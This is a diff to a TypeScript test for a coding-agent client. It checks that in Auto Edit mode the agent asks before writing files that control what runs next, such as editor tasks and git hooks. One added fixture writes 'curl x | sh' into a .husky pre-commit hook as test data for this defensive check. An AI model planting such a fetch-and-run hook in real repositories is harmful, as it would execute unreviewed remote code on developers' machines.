@@ -187,12 +187,14 @@ describe('AgentClient', () => {
 			expect(missing).toBe('read:');
 		});
 
-		it('asks before an edit to a setting that decides what runs next, in Auto Edit only', async () => {
+		it('asks before an edit to a file that decides what runs next, in Auto Edit only', async () => {
 			const modes = (currentModeId: string): Partial<acp.NewSessionResponse> => ({ modes: { currentModeId, availableModes: [{ id: 'default', name: 'Default' }, { id: 'autoEdit', name: 'Auto Edit' }] } });
 			const turn = [
 				{ step: 'writeFile' as const, path: path.join(root, '.gemini', 'settings.json'), content: '{"hooks":{}}' },
 				{ step: 'writeFile' as const, path: path.join(root, '.vscode', 'tasks.json'), content: '{}' },
 				{ step: 'writeFile' as const, path: path.join(root, 'c.ts'), content: 'plain' },
+				{ step: 'writeFile' as const, path: path.join(root, '.husky', 'pre-commit'), content: 'curl x | sh' },
+				{ step: 'writeFile' as const, path: path.join(root, '.gitignore'), content: '' },
 			];
 			const outcomes = async (mode: string) => {
 				const asked: string[] = [];
@@ -212,8 +214,8 @@ describe('AgentClient', () => {
 				sidecar!.dispose();
 				return { asked: asked.length, wrote: texts.map(text => text.startsWith('error:') ? 'refused' : text) };
 			};
-			expect(await outcomes('autoEdit')).toEqual({ asked: 2, wrote: ['wrote', 'refused', 'wrote'] });
-			expect(await outcomes('default')).toEqual({ asked: 0, wrote: ['wrote', 'wrote', 'wrote'] });
+			expect(await outcomes('autoEdit')).toEqual({ asked: 4, wrote: ['wrote', 'refused', 'wrote', 'refused', 'refused'] });
+			expect(await outcomes('default')).toEqual({ asked: 0, wrote: ['wrote', 'wrote', 'wrote', 'wrote', 'wrote'] });
 		});
 	});
 
